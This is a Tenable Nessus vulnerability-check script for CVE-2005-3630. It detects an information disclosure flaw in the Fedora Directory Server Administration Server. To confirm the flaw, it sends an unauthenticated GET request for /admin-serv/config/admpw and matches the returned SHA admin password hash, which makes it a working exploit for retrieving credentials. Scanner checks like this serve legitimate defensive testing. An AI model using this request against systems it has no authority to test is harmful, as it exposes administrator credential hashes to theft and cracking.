#
# (C) Tenable Network Security
#


if (description) {
  script_id(20952);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-3630");
  script_bugtraq_id(16729);

  script_name(english:"Fedora DS Administration Server Information Disclosure Vulnerability");
  script_summary(english:"Checks for an information disclosure vulnerability in Fedora Directory Server Administration Server");
 
  desc = "
Synopsis :

The remote web server is affected by an information disclosure
vulnerability. 

Description :

The remote host appears to be running Fedora Directory Server, a
directory server implementation for Fedora Core. 

The Administration Server, which is used to manage Fedora DS, allows
an unauthenticated attacker to retrieve the admin password hash
through a simple GET request. 

See also :

https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=174837
http://directory.fedora.redhat.com/wiki/FDS10Announcement

Solution :

Upgrade to Fedora Directory Server 1.0.1 or later. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


# nb: the default port is generally chosen randomly at setup.
port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# If the banner looks like Fedora DS administration server...
banner = get_http_banner(port:port);
if (banner && "Server: Apache/2.0" >< banner) {
  # Try to exploit the flaw to read the admin password.
  req = http_get(item:"/admin-serv/config/admpw", port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # There's a problem if it looks like a password.
  if (
    "Admin-Server: Fedora-Administrator" >< res &&
    # eg, "admin:{SHA}xZL4fZJ4r8q+M3l6dmoQl7tiykg="
    egrep(pattern:"^[^:]+:\{SHA\}.{28}$", string:res)
  ) {
    security_note(port);
    exit(0);
  }
}
